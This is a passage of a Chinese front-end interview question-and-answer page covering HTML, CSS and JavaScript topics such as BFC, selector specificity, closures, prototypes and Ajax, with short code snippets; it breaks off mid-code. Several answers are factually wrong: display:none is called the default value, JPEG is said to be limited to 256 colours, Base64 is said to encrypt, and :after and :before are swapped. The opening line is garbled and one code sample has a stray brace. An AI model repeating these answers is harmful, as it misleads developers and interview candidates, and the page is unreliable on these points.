<li>页面被加载的时，<code>link</code>会同时被加载，而<code>@imort</code>页面被加载的时，<code>link</code>会同时被加载，而<code>@import</code>引用的<code>CSS</code>会等到页面被加载完再加载<br />
<code>import</code>只在<code>IE5</code>以上才能识别，而<code>link</code>是<code>XHTML</code>标签，无兼容问题<br />
<code>link</code>方式的样式的权重 高于<code>@import</code>的权重</li>
<li><code>&lt;!DOCTYPE&gt;</code> 声明位于文档中的最前面，处于 <code>&lt;html&gt;</code> 标签之前。告知浏览器的解析器， 用什么文档类型 规范来解析这个文档</li>
<li>严格模式的排版和 <code>JS</code> 运作模式是 以该浏览器支持的最高标准运行</li>
<li>在混杂模式中，页面以宽松的向后兼容的方式显示。模拟老式浏览器的行为以防止站点无法工作。 <code>DOCTYPE</code>不存在或格式不正确会导致文档以混杂模式呈现</li>
</ul>
<h3 id="17-行内元素有哪些块级元素有哪些-空void元素有那些行内元素和块级元素有什么区别"><a class="markdownIt-Anchor" href="#17-行内元素有哪些块级元素有哪些-空void元素有那些行内元素和块级元素有什么区别"></a> 17、行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？行内元素和块级元素有什么区别？</h3>
<ul>
<li>行内元素有：<code>a b span img input select strong</code></li>
<li>块级元素有：<code>div ul ol li dl dt dd h1 h2 h3 h4…p</code></li>
<li>空元素：<code>&lt;br&gt; &lt;hr&gt; &lt;img&gt; &lt;input&gt; &lt;link&gt; &lt;meta&gt;</code></li>
<li>行内元素不可以设置宽高，不独占一行</li>
<li>块级元素可以设置宽高，独占一行</li>
</ul>
<h3 id="18-html全局属性global-attribute有哪些"><a class="markdownIt-Anchor" href="#18-html全局属性global-attribute有哪些"></a> 18、HTML全局属性(global attribute)有哪些</h3>
<ul>
<li><code>class</code>:为元素设置类标识</li>
<li><code>data-*</code>: 为元素增加自定义属性</li>
<li><code>draggable</code>: 设置元素是否可拖拽</li>
<li><code>id</code>: 元素<code>id</code>，文档内唯一</li>
<li><code>lang</code>: 元素内容的的语言</li>
<li><code>style</code>: 行内<code>css</code>样式</li>
<li><code>title</code>: 元素相关的建议信息</li>
</ul>
<h3 id="19-canvas和svg有什么区别"><a class="markdownIt-Anchor" href="#19-canvas和svg有什么区别"></a> 19、Canvas和SVG有什么区别？</h3>
<ul>
<li><code>svg</code>绘制出来的每一个图形的元素都是独立的<code>DOM</code>节点，能够方便的绑定事件或用来修改。<code>canvas</code>输出的是一整幅画布</li>
<li><code>svg</code>输出的图形是矢量图形，后期可以修改参数来自由放大缩小，不会是真和锯齿。而<code>canvas</code>输出标量画布，就像一张图片一样，放大会失真或者锯齿</li>
</ul>
<h3 id="20-html5-为什么只需要写-doctype-html"><a class="markdownIt-Anchor" href="#20-html5-为什么只需要写-doctype-html"></a> 20、HTML5 为什么只需要写 <!DOCTYPE HTML>？</h3>
<ul>
<li><code>HTML5</code> 不基于 <code>SGML</code>，因此不需要对<code>DTD</code>进行引用，但是需要<code>doctype</code>来规范浏览器的行为</li>
<li>而<code>HTML4.01</code>基于<code>SGML</code>,所以需要对<code>DTD</code>进行引用，才能告知浏览器文档所使用的文档类型</li>
</ul>
<h3 id="21-如何在页面上实现一个圆形的可点击区域"><a class="markdownIt-Anchor" href="#21-如何在页面上实现一个圆形的可点击区域"></a> 21、如何在页面上实现一个圆形的可点击区域？</h3>
<ul>
<li><code>svg</code></li>
<li><code>border-radius</code></li>
<li>纯<code>js</code>实现 需要求一个点在不在圆上简单算法、获取鼠标坐标等等</li>
</ul>
<h3 id="22-网页验证码是干嘛的是为了解决什么安全问题"><a class="markdownIt-Anchor" href="#22-网页验证码是干嘛的是为了解决什么安全问题"></a> 22、网页验证码是干嘛的，是为了解决什么安全问题</h3>
<ul>
<li>区分用户是计算机还是人的公共全自动程序。可以防止恶意破解密码、刷票、论坛灌水</li>
<li>有效防止黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试</li>
</ul>
<h2 id="css部分-2"><a class="markdownIt-Anchor" href="#css部分-2"></a> $CSS部分</h2>
<h3 id="1-css-sprite是什么有什么优缺点"><a class="markdownIt-Anchor" href="#1-css-sprite是什么有什么优缺点"></a> 1、css sprite是什么,有什么优缺点</h3>
<ul>
<li>
<p>概念：将多个小图片拼接到一个图片中。通过<code>background-position</code>和元素尺寸调节需要显示的背景图案。</p>
</li>
<li>
<p>优点：</p>
<ul>
<li>减少<code>HTTP</code>请求数，极大地提高页面加载速度</li>
<li>增加图片信息重复度，提高压缩比，减少图片大小</li>
<li>更换风格方便，只需在一张或几张图片上修改颜色或样式即可实现</li>
</ul>
</li>
<li>
<p>缺点：</p>
<ul>
<li>图片合并麻烦</li>
<li>维护麻烦，修改一个图片可能需要从新布局整个图片，样式</li>
</ul>
</li>
</ul>
<h3 id="2-display-none与visibility-hidden的区别"><a class="markdownIt-Anchor" href="#2-display-none与visibility-hidden的区别"></a> 2、<code>display: none;</code>与<code>visibility: hidden;</code>的区别</h3>
<ul>
<li>
<p>联系：它们都能让元素不可见</p>
</li>
<li>
<p>区别：</p>
<ul>
<li><code>display:none</code>;会让元素完全从渲染树中消失，渲染的时候不占据任何空间；<code>visibility: hidden</code>;不会让元素从渲染树消失，渲染师元素继续占据空间，只是内容不可见</li>
<li><code>display: none</code>;是非继承属性，子孙节点消失由于元素从渲染树消失造成，通过修改子孙节点属性无法显示<code>；visibility: hidden;</code>是继承属性，子孙节点消失由于继承了<code>hidden</code>，通过设置<code>visibility: visible;</code>可以让子孙节点显式</li>
<li>修改常规流中元素的<code>display</code>通常会造成文档重排。修改<code>visibility</code>属性只会造成本元素的重绘。</li>
<li>读屏器不会读取<code>display: none</code>;元素内容；会读取<code>visibility: hidden;</code>元素内容</li>
</ul>
</li>
</ul>
<h3 id="3-link与import的区别"><a class="markdownIt-Anchor" href="#3-link与import的区别"></a> 3、<code>link</code>与<code>@import</code>的区别</h3>
<ol>
<li><code>link</code>是<code>HTML</code>方式， <code>@import</code>是CSS方式</li>
<li><code>link</code>最大限度支持并行下载，<code>@import</code>过多嵌套导致串行下载，出现<code>FOUC</code></li>
<li><code>link</code>可以通过<code>rel=&quot;alternate stylesheet&quot;</code>指定候选样式</li>
<li>浏览器对<code>link</code>支持早于<code>@import</code>，可以使用<code>@import</code>对老浏览器隐藏样式</li>
<li><code>@import</code>必须在样式规则之前，可以在css文件中引用其他文件</li>
<li>总体来说：<code>link</code>优于<code>@import</code></li>
</ol>
<h3 id="4-什么是fouc如何避免"><a class="markdownIt-Anchor" href="#4-什么是fouc如何避免"></a> 4、什么是FOUC?如何避免</h3>
<ul>
<li><code>Flash Of Unstyled Content</code>：用户定义样式表加载之前浏览器使用默认样式显示文档，用户样式加载渲染之后再从新显示文档，造成页面闪烁。</li>
<li><strong>解决方法</strong>：把样式表放到文档的<code>head</code></li>
</ul>
<h3 id="5-如何创建块级格式化上下文block-formatting-contextbfc有什么用"><a class="markdownIt-Anchor" href="#5-如何创建块级格式化上下文block-formatting-contextbfc有什么用"></a> 5、如何创建块级格式化上下文(block formatting context),BFC有什么用</h3>
<ul>
<li>
<p>创建规则：</p>
<ul>
<li>根元素</li>
<li>浮动元素（<code>float</code>不是<code>none</code>）</li>
<li>绝对定位元素（<code>position</code>取值为<code>absolute</code>或<code>fixed</code>）</li>
<li><code>display</code>取值为<code>inline-block</code>,<code>table-cell</code>, <code>table-caption</code>,<code>flex</code>, <code>inline-flex</code>之一的元素</li>
<li><code>overflow</code>不是<code>visible</code>的元素</li>
</ul>
</li>
<li>
<p>作用：</p>
<ul>
<li>可以包含浮动元素</li>
<li>不被浮动元素覆盖</li>
<li>阻止父子元素的<code>margin</code>折叠</li>
</ul>
</li>
</ul>
<h3 id="6-displayfloatposition的关系"><a class="markdownIt-Anchor" href="#6-displayfloatposition的关系"></a> 6、display,float,position的关系</h3>
<ul>
<li>如果<code>display</code>为<code>none</code>，那么<code>position</code>和<code>float</code>都不起作用，这种情况下元素不产生框</li>
<li>否则，如果<code>position</code>值为<code>absolute</code>或者<code>fixed</code>，框就是绝对定位的，<code>float</code>的计算值为<code>none</code>，<code>display</code>根据下面的表格进行调整。</li>
<li>否则，如果<code>float</code>不是<code>none</code>，框是浮动的，<code>display</code>根据下表进行调整</li>
<li>否则，如果元素是根元素，<code>display</code>根据下表进行调整</li>
<li>其他情况下<code>display</code>的值为指定值</li>
<li>总结起来：<strong>绝对定位、浮动、根元素都需要调整<code>display</code></strong></li>
</ul>
<h3 id="7-清除浮动的几种方式各自的优缺点"><a class="markdownIt-Anchor" href="#7-清除浮动的几种方式各自的优缺点"></a> 7、清除浮动的几种方式，各自的优缺点</h3>
<ul>
<li>父级<code>div</code>定义<code>height</code></li>
<li>结尾处加空<code>div</code>标签<code>clear:both</code></li>
<li>父级<code>div</code>定义伪类<code>:after</code>和<code>zoom</code></li>
<li>父级<code>div</code>定义<code>overflow:hidden</code></li>
<li>父级<code>div</code>也浮动，需要定义宽度</li>
<li>结尾处加<code>br</code>标签<code>clear:both</code></li>
<li>比较好的是第3种方式，好多网站都这么用</li>
</ul>
<h3 id="8-为什么要初始化css样式"><a class="markdownIt-Anchor" href="#8-为什么要初始化css样式"></a> 8、为什么要初始化CSS样式?</h3>
<ul>
<li>因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对<code>CSS</code>初始化往往会出现浏览器之间的页面显示差异。</li>
<li>当然，初始化样式会对<code>SEO</code>有一定的影响，但鱼和熊掌不可兼得，但力求影响最小的情况下初始化</li>
</ul>
<h3 id="9-css3有哪些新特性"><a class="markdownIt-Anchor" href="#9-css3有哪些新特性"></a> 9、css3有哪些新特性</h3>
<ul>
<li>新增各种<code>css</code>选择器</li>
<li>圆角 <code>border-radius</code></li>
<li>多列布局</li>
<li>阴影和反射</li>
<li>文字特效<code>text-shadow</code></li>
<li>线性渐变</li>
<li>旋转<code>transform</code></li>
</ul>
<p><strong>CSS3新增伪类有那些？</strong></p>
<ul>
<li><code>p:first-of-type</code> 选择属于其父元素的首个<code>&lt;p&gt;</code>元素的每个 <code>&lt;p&gt;</code> 元素。</li>
<li><code>p:last-of-type</code>  选择属于其父元素的最后 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素。</li>
<li><code>p:only-of-type</code>  选择属于其父元素唯一的 <code>&lt;p&gt;</code>元素的每个 <code>&lt;p&gt;</code> 元素。</li>
<li><code>p:only-child</code>       选择属于其父元素的唯一子元素的每个 <code>&lt;p&gt;</code> 元素。</li>
<li><code>p:nth-child(2)</code>  选择属于其父元素的第二个子元素的每个 <code>&lt;p&gt;</code> 元素。</li>
<li><code>:after</code>        在元素之前添加内容,也可以用来做清除浮动。</li>
<li><code>:before</code>       在元素之后添加内容</li>
<li><code>:enabled</code></li>
<li><code>:disabled</code>      控制表单控件的禁用状态。</li>
<li><code>:checked</code>       单选框或复选框被选中</li>
</ul>
<h3 id="10-display有哪些值说明他们的作用"><a class="markdownIt-Anchor" href="#10-display有哪些值说明他们的作用"></a> 10、display有哪些值？说明他们的作用</h3>
<ul>
<li><code>block</code>      象块类型元素一样显示。</li>
<li><code>none</code>      缺省值。象行内元素类型一样显示。</li>
<li><code>inline-block</code> 象行内元素一样显示，但其内容象块类型元素一样显示。</li>
<li><code>list-item</code>   象块类型元素一样显示，并添加样式列表标记。</li>
<li><code>table</code>       此元素会作为块级表格来显示</li>
<li><code>inherit</code>      规定应该从父元素继承 <code>display</code> 属性的值</li>
</ul>
<h3 id="11-介绍一下标准的css的盒子模型低版本ie的盒子模型有什么不同的"><a class="markdownIt-Anchor" href="#11-介绍一下标准的css的盒子模型低版本ie的盒子模型有什么不同的"></a> 11、介绍一下标准的CSS的盒子模型？低版本IE的盒子模型有什么不同的？</h3>
<ul>
<li>有两种， <code>IE</code>盒子模型、<code>W3C</code>盒子模型；</li>
<li>盒模型： 内容(content)、填充(<code>padding</code>)、边界(<code>margin</code>)、 边框(<code>border</code>)；</li>
<li>区  别： <code>IE</code>的c<code>ontent</code>部分把 <code>border</code> 和 <code>padding</code>计算了进去;</li>
</ul>
<h3 id="12-css优先级算法如何计算"><a class="markdownIt-Anchor" href="#12-css优先级算法如何计算"></a> 12、CSS优先级算法如何计算？</h3>
<ul>
<li>优先级就近原则，同权重情况下样式定义最近者为准</li>
<li>载入样式以最后载入的定位为准</li>
<li>优先级为: <code>!important &gt; id &gt; class &gt; tag</code> <code>important</code> 比 内联优先级高</li>
</ul>
<h3 id="13-对bfc规范的理解"><a class="markdownIt-Anchor" href="#13-对bfc规范的理解"></a> 13、对BFC规范的理解？</h3>
<ul>
<li>它决定了元素如何对其内容进行定位,以及与其他元素的关系和相互作用</li>
</ul>
<h3 id="14-谈谈浮动和清除浮动"><a class="markdownIt-Anchor" href="#14-谈谈浮动和清除浮动"></a> 14、谈谈浮动和清除浮动</h3>
<ul>
<li>浮动的框可以向左或向右移动，直到他的外边缘碰到包含框或另一个浮动框的边框为止。由于浮动框不在文档的普通流中，所以文档的普通流的块框表现得就像浮动框不存在一样。浮动的块框会漂浮在文档普通流的块框上</li>
</ul>
<h3 id="15-position的值-relative和absolute定位原点是"><a class="markdownIt-Anchor" href="#15-position的值-relative和absolute定位原点是"></a> 15、position的值， relative和absolute定位原点是</h3>
<ul>
<li><code>absolute</code>：生成绝对定位的元素，相对于 <code>static</code> 定位以外的第一个父元素进行定位</li>
<li><code>fixed</code>：生成绝对定位的元素，相对于浏览器窗口进行定位</li>
<li><code>relative</code>：生成相对定位的元素，相对于其正常位置进行定位</li>
<li><code>static</code> 默认值。没有定位，元素出现在正常的流中</li>
<li><code>inherit</code> 规定从父元素继承 <code>position</code> 属性的值</li>
</ul>
<h3 id="16-displayinline-block-什么时候不会显示间隙携程"><a class="markdownIt-Anchor" href="#16-displayinline-block-什么时候不会显示间隙携程"></a> 16、display:inline-block 什么时候不会显示间隙？(携程)</h3>
<ul>
<li>移除空格</li>
<li>使用<code>margin</code>负值</li>
<li>使用<code>font-size:0</code></li>
<li><code>letter-spacing</code></li>
<li><code>word-spacing</code></li>
</ul>
<h3 id="17-pnggifjpg的区别及如何选"><a class="markdownIt-Anchor" href="#17-pnggifjpg的区别及如何选"></a> 17、PNG,GIF,JPG的区别及如何选</h3>
<ul>
<li>
<p><code>GIF</code></p>
<ul>
<li><code>8</code>位像素，<code>256</code>色</li>
<li>无损压缩</li>
<li>支持简单动画</li>
<li>支持<code>boolean</code>透明</li>
<li>适合简单动画</li>
</ul>
</li>
<li>
<p><code>JPEG</code></p>
<ul>
<li>颜色限于<code>256</code></li>
<li>有损压缩</li>
<li>可控制压缩质量</li>
<li>不支持透明</li>
<li>适合照片</li>
</ul>
</li>
<li>
<p><code>PNG</code></p>
<ul>
<li>有<code>PNG8</code>和<code>truecolor PNG</code></li>
<li><code>PNG8</code>类似<code>GIF</code>颜色上限为<code>256</code>，文件小，支持<code>alpha</code>透明度，无动画</li>
<li>适合图标、背景、按钮</li>
</ul>
</li>
</ul>
<h3 id="18-行内元素floatleft后是否变为块级元素"><a class="markdownIt-Anchor" href="#18-行内元素floatleft后是否变为块级元素"></a> 18、行内元素float:left后是否变为块级元素？</h3>
<ul>
<li>浮动后，行内元素不会成为块状元素，但是可以设置宽高。行内元素要想变成块状元素，占一行，直接设置<code>display:block</code>;。但如果元素设置了浮动后再设置<code>display:block</code>;那就不会占一行。</li>
</ul>
<h3 id="19-在网页中的应该使用奇数还是偶数的字体为什么呢"><a class="markdownIt-Anchor" href="#19-在网页中的应该使用奇数还是偶数的字体为什么呢"></a> 19、在网页中的应该使用奇数还是偶数的字体？为什么呢？</h3>
<ul>
<li>偶数字号相对更容易和 web 设计的其他部分构成比例关系</li>
</ul>
<h3 id="20-before-和-after中双冒号和单冒号-有什么区别解释一下这2个伪元素的作用"><a class="markdownIt-Anchor" href="#20-before-和-after中双冒号和单冒号-有什么区别解释一下这2个伪元素的作用"></a> 20、::before 和 :after中双冒号和单冒号 有什么区别？解释一下这2个伪元素的作用</h3>
<ul>
<li>单冒号(<code>:</code>)用于CSS3伪类，双冒号(<code>::</code>)用于<code>CSS3</code>伪元素</li>
<li>用于区分伪类和伪元素</li>
</ul>
<h3 id="21-如果需要手动写动画你认为最小时间间隔是多久为什么阿里"><a class="markdownIt-Anchor" href="#21-如果需要手动写动画你认为最小时间间隔是多久为什么阿里"></a> 21、如果需要手动写动画，你认为最小时间间隔是多久，为什么？（阿里）</h3>
<ul>
<li>多数显示器默认频率是<code>60Hz</code>，即<code>1</code>秒刷新<code>60</code>次，所以理论上最小间隔为<code>1/60＊1000ms ＝ 16.7ms</code></li>
</ul>
<h3 id="22-css合并方法"><a class="markdownIt-Anchor" href="#22-css合并方法"></a> 22、CSS合并方法</h3>
<ul>
<li>避免使用<code>@import</code>引入多个<code>css</code>文件，可以使用<code>CSS</code>工具将<code>CSS</code>合并为一个<code>CSS</code>文件，例如使用<code>Sass\Compass</code>等</li>
</ul>
<h3 id="23-css不同选择器的权重css层叠的规则"><a class="markdownIt-Anchor" href="#23-css不同选择器的权重css层叠的规则"></a> 23、CSS不同选择器的权重(CSS层叠的规则)</h3>
<ul>
<li><code>！important</code>规则最重要，大于其它规则</li>
<li>行内样式规则，加<code>1000</code></li>
<li>对于选择器中给定的各个<code>ID</code>属性值，加<code>100</code></li>
<li>对于选择器中给定的各个类属性、属性选择器或者伪类选择器，加<code>10</code></li>
<li>对于选择其中给定的各个元素标签选择器，加1</li>
<li>如果权值一样，则按照样式规则的先后顺序来应用，顺序靠后的覆盖靠前的规则</li>
</ul>
<h3 id="24-列出你所知道可以改变页面布局的属性"><a class="markdownIt-Anchor" href="#24-列出你所知道可以改变页面布局的属性"></a> 24、列出你所知道可以改变页面布局的属性</h3>
<ul>
<li><code>position</code>、<code>display</code>、<code>float</code>、<code>width</code>、<code>heigh</code>t、<code>margin</code>、<code>padding</code>、<code>top</code>、<code>left</code>、<code>right</code>、<code>overflow</code></li>
</ul>
<h3 id="25-css在性能优化方面的实践"><a class="markdownIt-Anchor" href="#25-css在性能优化方面的实践"></a> 25、CSS在性能优化方面的实践</h3>
<ul>
<li><code>css</code>压缩与合并、<code>Gzip</code>压缩</li>
<li><code>css</code>文件放在<code>head</code>里、不要用<code>@import</code></li>
<li>尽量用缩写、避免用滤镜、合理使用选择器</li>
</ul>
<h3 id="26-css3动画简单动画的实现如旋转等"><a class="markdownIt-Anchor" href="#26-css3动画简单动画的实现如旋转等"></a> 26、CSS3动画（简单动画的实现，如旋转等）</h3>
<ul>
<li>依靠<code>CSS3</code>中提出的三个属性：<code>transition</code>、<code>transform</code>、<code>animation</code></li>
<li><code>transition</code>：定义了元素在变化过程中是怎么样的，包含<code>transition-property</code>、<code>transition-duration</code>、<code>transition-timing-function</code>、<code>transition-delay</code>。</li>
<li><code>transform</code>：定义元素的变化结果，包含<code>rotate</code>、<code>scale</code>、<code>skew</code>、<code>translate</code>。</li>
<li><code>animation</code>：动画定义了动作的每一帧（<code>@keyframes</code>）有什么效果，包括<code>animation-name</code>，<code>animation-duration</code>、<code>animation-timing-function</code>、<code>animation-delay</code>、<code>animation-iteration-count</code>、<code>animation-direction</code></li>
</ul>
<h3 id="27-base64的原理及优缺点"><a class="markdownIt-Anchor" href="#27-base64的原理及优缺点"></a> 27、base64的原理及优缺点</h3>
<ul>
<li>优点可以加密，减少了<code>http</code>请求</li>
<li>缺点是需要消耗<code>CPU</code>进行编解码</li>
</ul>
<h2 id="javascript-2"><a class="markdownIt-Anchor" href="#javascript-2"></a> $JavaScript</h2>
<h3 id="1-闭包"><a class="markdownIt-Anchor" href="#1-闭包"></a> 1、闭包</h3>
<ul>
<li>
<p>闭包就是能够读取其他函数内部变量的函数</p>
</li>
<li>
<p>闭包是指有权访问另一个函数作用域中变量的函数，创建闭包的最常见的方式就是在一个函数内创建另一个函数，通过另一个函数访问这个函数的局部变量,利用闭包可以突破作用链域</p>
</li>
<li>
<p>闭包的特性：</p>
<ul>
<li>函数内再嵌套函数</li>
<li>内部函数可以引用外层的参数和变量</li>
<li>参数和变量不会被垃圾回收机制回收</li>
</ul>
</li>
</ul>
<p><strong>说说你对闭包的理解</strong></p>
<ul>
<li>
<p>使用闭包主要是为了设计私有的方法和变量。闭包的优点是可以避免全局变量的污染，缺点是闭包会常驻内存，会增大内存使用量，使用不当很容易造成内存泄露。在js中，函数即闭包，只有函数才会产生作用域的概念</p>
</li>
<li>
<p>闭包 的最大用处有两个，一个是可以读取函数内部的变量，另一个就是让这些变量始终保持在内存中</p>
</li>
<li>
<p>闭包的另一个用处，是封装对象的私有属性和私有方法</p>
</li>
<li>
<p><strong>好处</strong>：能够实现封装和缓存等；</p>
</li>
<li>
<p><strong>坏处</strong>：就是消耗内存、不正当使用会造成内存溢出的问题</p>
</li>
</ul>
<p><strong>使用闭包的注意点</strong></p>
<ul>
<li>由于闭包会使得函数中的变量都被保存在内存中，内存消耗很大，所以不能滥用闭包，否则会造成网页的性能问题，在IE中可能导致内存泄露</li>
<li>解决方法是，在退出函数之前，将不使用的局部变量全部删除</li>
</ul>
<h3 id="2-说说你对作用域链的理解"><a class="markdownIt-Anchor" href="#2-说说你对作用域链的理解"></a> 2、说说你对作用域链的理解</h3>
<ul>
<li>作用域链的作用是保证执行环境里有权访问的变量和函数是有序的，作用域链的变量只能向上访问，变量访问到<code>window</code>对象即被终止，作用域链向下访问变量是不被允许的</li>
<li>简单的说，作用域就是变量与函数的可访问范围，即作用域控制着变量与函数的可见性和生命周期</li>
</ul>
<h3 id="3-javascript原型原型链-有什么特点"><a class="markdownIt-Anchor" href="#3-javascript原型原型链-有什么特点"></a> 3、JavaScript原型，原型链 ? 有什么特点？</h3>
<ul>
<li>
<p>每个对象都会在其内部初始化一个属性，就是<code>prototype</code>(原型)，当我们访问一个对象的属性时</p>
</li>
<li>
<p>如果这个对象内部不存在这个属性，那么他就会去<code>prototype</code>里找这个属性，这<code>个prototype</code>又会有自己的<code>prototype</code>，于是就这样一直找下去，也就是我们平时所说的原型链的概念</p>
</li>
<li>
<p>关系：<code>instance.constructor.prototype = instance.__proto__</code></p>
</li>
<li>
<p>特点：</p>
<ul>
<li><code>JavaScript</code>对象是通过引用来传递的，我们创建的每个新对象实体中并没有一份属于自己的原型副本。当我们修改原型时，与之相关的对象也会继承这一改变</li>
</ul>
</li>
<li>
<p>当我们需要一个属性的时，<code>Javascript</code>引擎会先看当前对象中是否有这个属性， 如果没有的</p>
</li>
<li>
<p>就会查找他的<code>Prototype</code>对象是否有这个属性，如此递推下去，一直检索到 <code>Object</code> 内建对象</p>
</li>
</ul>
<h3 id="4-请解释什么是事件代理"><a class="markdownIt-Anchor" href="#4-请解释什么是事件代理"></a> 4、请解释什么是事件代理</h3>
<ul>
<li>事件代理（<code>Event Delegation</code>），又称之为事件委托。是 <code>JavaScript</code> 中常用绑定事件的常用技巧。顾名思义，“事件代理”即是把原本需要绑定的事件委托给父元素，让父元素担当事件监听的职务。事件代理的原理是DOM元素的事件冒泡。使用事件代理的好处是可以提高性能</li>
<li>可以大量节省内存占用，减少事件注册，比如在<code>table</code>上代理所有<code>td</code>的<code>click</code>事件就非常棒</li>
<li>可以实现当新增子对象时无需再次对其绑定</li>
</ul>
<h3 id="5-javascript如何实现继承"><a class="markdownIt-Anchor" href="#5-javascript如何实现继承"></a> 5、Javascript如何实现继承？</h3>
<ul>
<li>
<p>构造继承</p>
</li>
<li>
<p>原型继承</p>
</li>
<li>
<p>实例继承</p>
</li>
<li>
<p>拷贝继承</p>
</li>
<li>
<p>原型<code>prototype</code>机制或<code>apply</code>和<code>call</code>方法去实现较简单，建议使用构造函数与原型混合方式</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">this</span>.name = <span class="string">'wang'</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">Child</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">this</span>.age = <span class="number">28</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   Child.prototype = <span class="keyword">new</span> Parent();<span class="comment">//继承了Parent，通过原型</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> demo = <span class="keyword">new</span> Child();</span><br><span class="line">   alert(demo.age);</span><br><span class="line">   alert(demo.name);<span class="comment">//得到被继承的属性</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="6-谈谈this对象的理解"><a class="markdownIt-Anchor" href="#6-谈谈this对象的理解"></a> 6、谈谈This对象的理解</h3>
<ul>
<li><code>this</code>总是指向函数的直接调用者（而非间接调用者）</li>
<li>如果有<code>new</code>关键字，<code>this</code>指向<code>new</code>出来的那个对象</li>
<li>在事件中，<code>this</code>指向触发这个事件的对象，特殊的是，<code>IE</code>中的<code>attachEvent</code>中的<code>this</code>总是指向全局对象<code>Window</code></li>
</ul>
<h3 id="7-事件模型"><a class="markdownIt-Anchor" href="#7-事件模型"></a> 7、事件模型</h3>
<blockquote>
<p><code>W3C</code>中定义事件的发生经历三个阶段：捕获阶段（<code>capturing</code>）、目标阶段（<code>targetin</code>）、冒泡阶段（<code>bubbling</code>）</p>
</blockquote>
<ul>
<li>冒泡型事件：当你使用事件冒泡时，子级元素先触发，父级元素后触发</li>
<li>捕获型事件：当你使用事件捕获时，父级元素先触发，子级元素后触发</li>
<li><code>DOM</code>事件流：同时支持两种事件模型：捕获型事件和冒泡型事件</li>
<li>阻止冒泡：在<code>W3c</code>中，使用<code>stopPropagation（）</code>方法；在IE下设置<code>cancelBubble = true</code></li>
<li>阻止捕获：阻止事件的默认行为，例如<code>click - &lt;a&gt;</code>后的跳转。在<code>W3c</code>中，使用<code>preventDefault（）</code>方法，在<code>IE</code>下设置<code>window.event.returnValue = false</code></li>
</ul>
<h3 id="8-new操作符具体干了什么呢"><a class="markdownIt-Anchor" href="#8-new操作符具体干了什么呢"></a> 8、new操作符具体干了什么呢?</h3>
<ul>
<li>创建一个空对象，并且 <code>this</code> 变量引用该对象，同时还继承了该函数的原型</li>
<li>属性和方法被加入到 <code>this</code> 引用的对象中</li>
<li>新创建的对象由 <code>this</code> 所引用，并且最后隐式的返回 <code>this</code></li>
</ul>
<h3 id="9-ajax原理"><a class="markdownIt-Anchor" href="#9-ajax原理"></a> 9、Ajax原理</h3>
<ul>
<li><code>Ajax</code>的原理简单来说是在用户和服务器之间加了—个中间层(<code>AJAX</code>引擎)，通过<code>XmlHttpRequest</code>对象来向服务器发异步请求，从服务器获得数据，然后用<code>javascrip</code>t来操作<code>DOM</code>而更新页面。使用户操作与服务器响应异步化。这其中最关键的一步就是从服务器获得请求数据</li>
<li><code>Ajax</code>的过程只涉及<code>JavaScript</code>、<code>XMLHttpRequest</code>和<code>DOM</code>。<code>XMLHttpRequest</code>是<code>aja</code>x的核心机制</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 创建连接</span></span><br><span class="line">   <span class="keyword">var</span> xhr = <span class="literal">null</span>;</span><br><span class="line">   xhr = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">   <span class="comment">// 2. 连接服务器</span></span><br><span class="line">   xhr.open(<span class="string">'get'</span>, url, <span class="literal">true</span>)</span><br><span class="line">   <span class="comment">// 3. 发送请求</span></span><br><span class="line">   xhr.send(<span class="literal">null</span>);</span><br><span class="line">   <span class="comment">// 4. 接受请求</span></span><br><span class="line">   xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(xhr.readyState == <span class="number">4</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(xhr.status == <span class="number">200</span>)&#123;</span><br><span class="line">               success(xhr.responseText);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123; <span class="comment">// fail</span></span><br><span class="line">               fail &amp;&amp; fail(xhr.status);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p><strong>ajax 有那些优缺点?</strong></p>
<ul>
<li>优点：
<ul>
<li>通过异步模式，提升了用户体验.</li>
<li>优化了浏览器和服务器之间的传输，减少不必要的数据往返，减少了带宽占用.</li>
<li><code>Ajax</code>在客户端运行，承担了一部分本来由服务器承担的工作，减少了大用户量下的服务器负载。</li>
<li><code>Ajax</code>可以实现动态不刷新（局部刷新）</li>
</ul>
</li>
<li>缺点：
<ul>
<li>安全问题 <code>AJAX</code>暴露了与服务器交互的细节。</li>
<li>对搜索引擎的支持比较弱。</li>
<li>不容易调试。</li>
</ul>
</li>
</ul>
<h3 id="10-如何解决跨域问题"><a class="markdownIt-Anchor" href="#10-如何解决跨域问题"></a> 10、如何解决跨域问题?</h3>
<ul>
<li><code>jsonp</code>、 <code>iframe</code>、<code>window.name</code>、<code>window.postMessage</code>、服务器上设置代理页面</li>
</ul>
<h3 id="11-模块化开发怎么做"><a class="markdownIt-Anchor" href="#11-模块化开发怎么做"></a> 11、模块化开发怎么做？</h3>
<ul>
<li>立即执行函数,不暴露私有成员</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> module1 = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">　　　　<span class="keyword">var</span> _count = <span class="number">0</span>;</span><br><span class="line">　　　　<span class="keyword">var</span> m1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">　　　　　　<span class="comment">//...</span></span><br><span class="line">　　　　&#125;;</span><br><span class="line">　　　　<span class="keyword">var</span> m2 = <span 